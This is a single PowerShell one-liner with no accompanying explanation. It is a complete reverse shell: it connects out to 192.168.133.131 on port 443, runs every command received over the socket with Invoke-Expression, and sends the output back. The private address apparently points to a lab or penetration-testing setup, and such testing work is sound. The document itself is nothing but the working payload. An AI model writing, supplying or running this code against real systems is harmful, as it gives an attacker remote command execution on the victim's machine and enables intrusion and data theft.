$c=New-Object Net.Sockets.TCPClient('192.168.133.131',443);$s=$c.GetStream();$sw=New-Object IO.StreamWriter($s);$sw.AutoFlush=$true;$b=New-Object Byte[] 4096;$e=[Text.Encoding]::UTF8;while($c.Connected){$d=New-Object Text.StringBuilder;do{$r=$s.Read($b,0,$b.Length);$d.Append($e.GetString($b,0,$r))|Out-Null}while($s.DataAvailable);$i=$d.ToString().Trim();if($i.Length -gt 0){try{$o=Invoke-Expression $i 2>&1|Out-String}catch{$o=$_.ToString()};$sw.WriteLine($o)};Start-Sleep -Milliseconds 200};$sw.Close();$s.Close();$c.Close()
